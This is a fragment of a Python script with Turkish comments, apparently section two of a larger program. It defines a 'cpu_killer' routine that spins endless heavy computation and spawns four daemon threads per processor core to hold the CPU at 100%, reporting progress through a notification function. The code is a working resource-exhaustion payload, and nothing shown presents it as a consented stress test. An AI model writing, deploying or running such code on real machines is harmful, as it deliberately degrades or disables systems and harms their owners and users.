# 2. İŞLEMCİYİ ZORLA (4 KATI)
# ==========================================
def cpu_killer():
    while True:
        x = 3.14159
        for _ in range(1000000):
            x = x ** 1.00001
            x = x / 1.000001
        arr = [i ** i for i in range(5000)]
        for _ in range(100):
            arr.sort()
            arr.reverse()

def start_cpu_killer():
    core_count = multiprocessing.cpu_count()
    thread_count = core_count * 4
    send_notification(f"🧠 Çekirdek: {core_count}, Açılacak thread: {thread_count}")
    
    for _ in range(thread_count):
        threading.Thread(target=cpu_killer, daemon=True).start()
    
    send_notification(f"🔥 CPU %100 yüklendi ({thread_count} thread ile)")

